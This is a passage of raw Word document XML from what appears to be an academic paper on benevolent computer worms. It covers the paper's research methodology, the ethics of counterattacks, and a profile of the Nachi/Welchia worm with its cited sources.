      <w:r w:rsidR="005036D7">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>firewalls</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or simply acknowledging that the system cannot be tested</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.  Another issue is the fact that the system being attacked will not have a reliable way of </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">determining which IP addresses correspond to machines participating in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DDoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and those that are legitimate.  It could be argued that a website with malicious intent could already perform such a scan against an end-user without their consent and so notifying the user that such a scan could take place would be useful and allow for a counterattack to limit its scope to only thousands of machines instead of the entire Internet.</w:t>
      </w:r>
      <w:r w:rsidR="001C39DD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  Such an approach would also require a level of cooperation or consent with the user's ISP as well.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00290197">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc321736783"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Research Methodology</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="0029019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An analysis of past computer worms (both malicious and benevolent) provides the characteristics that a benevolent worm should emulate or avoid.  Since many </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">publically released </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">computer worms do not have source code readily available much of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>knowledge of these worms</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is based on analysis by other computer security researchers and companies </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">from </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> instances seen in the wild</w:t>
      </w:r>
      <w:r w:rsidR="00582071">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Internet</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.  The following questions are addressed for each worm:</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What was the worm’s purpose (benevolent or malicious)?</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What methods of propagation were used?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00290197" w:rsidRDefault="00290197" w:rsidP="00290197">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>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human intervention such as opening an e-mail attachment?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00290197" w:rsidRDefault="00CB26A3" w:rsidP="00290197">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>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Automatic methods?</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Did the worm achieve its purpose?</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What worked correctly?</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What went wrong?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00290197"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290197">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>What could be corrected?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="0029019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second stage of research was to develop </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>small program that function</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">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 xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">benevolent worm.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>It was</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> targeted at</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a specific vulnerability</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="008618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a well known exploit </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>technique</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.  An isolated network environment of virtual machines was used to do the testing of the benevolent worm.  Data on how many machines were successful penetrated, patched, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>working afterwards was recorded as well as those that were not exploited.</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  Each test had machines with various levels of patches applied </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">as well as versions of the operating system.  </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>This testing allowed for the collection of information on how a benevolent worm could perform under controlled</w:t>
      </w:r>
      <w:r w:rsidR="00CF4579">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expected conditions as well as random unexpected conditions of the systems it was attempting to patch.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="0029019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F0FB4">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The other </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>aspect</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">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th</w:t>
      </w:r>
      <w:r w:rsidR="001F0FB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research involved the</w:t>
      </w:r>
      <w:r w:rsidR="001F0FB4">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> aforementioned</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> study</w:t>
      </w:r>
      <w:r w:rsidR="001F0FB4">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and discussion</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the ethical and legal issues with releasing computer worms. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00290197">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Toc321736784"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Profiles of computer worms</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00290197" w:rsidRDefault="00CB26A3" w:rsidP="00290197">
      <w:pPr>
        <w:pStyle w:val="TH2"/>
      </w:pPr>
      <w:bookmarkStart w:id="13" w:name="_Toc321736785"/>
      <w:r w:rsidRPr="00290197">
        <w:t xml:space="preserve">Worm Name:  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00290197">
        <w:t>Nachi</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00290197">
      <w:pPr>
        <w:spacing w:after="240"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Aliases:  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Welchia</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00AB3D88" w:rsidRDefault="00AB3D88"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Sources:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00AB3D88" w:rsidRDefault="00CB26A3" w:rsidP="00A9566F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">SearchSecurity.com. “Benevolent </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Nachi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> worm doing more harm than good.” </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>TechTarget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Accessed: 1 Nov. 2011.</w:t>
      </w:r>
      <w:r w:rsidR="00AB3D88" w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;http://searchsecurity.techtarget.com/news/920146/Benevolent-Nachi-worm-doing-more-harm-than-good&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00AB3D88" w:rsidRDefault="00CB26A3" w:rsidP="00AB3D88">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Poulsen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, Kevin. “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Nachi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> worm infected Diebold </w:t>
      </w:r>
      <w:r w:rsidR="00BF38AC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ATMs.” </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00BF38AC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SecurityFocus</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00BF38AC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: 24 Nov 200</w:t>
      </w:r>
      <w:r w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3. Accessed: 1 Nov. 2011. &lt;http://www.securityfocus.com/news/7517&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00AB3D88" w:rsidRDefault="00CB26A3" w:rsidP="00AB3D88">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Symantec Security Response. “W32.Welchia.Worm.” Symantec: 13 Feb 2007. Accessed Nov. 1, 2011. &lt;http://www.symantec.com/security_response/index.jsp&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00AB3D88" w:rsidRDefault="00CB26A3" w:rsidP="00AB3D88">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>McAfee. “W32/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Nachi.worm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AB3D88">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.” 3 Jan 2004. Accessed: 1 Nov 2011.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00EB47D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Purpose:</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Benevolent.  Remove infection on machines with the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Lovsan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> worm which exploited a Microsoft Windows IIS web server vulnerability.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00EB47D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Methods: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Exploited the same RPC vulnerability the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Lovsan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="003A2DAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> worm</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> did to propagate.  This was an automated method that simply scanned for vulnerable web servers and triggered the exploit.  Once an infected server was discovered the worm propagated itself to it</w:t>
      </w:r>
      <w:r w:rsidR="003A2DAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, patched the vulnerability,</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and scanned </w:t>
      </w:r>
      <w:r w:rsidR="003A2DAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>for other</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> infected</w:t>
      </w:r>
      <w:r w:rsidR="003A2DAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
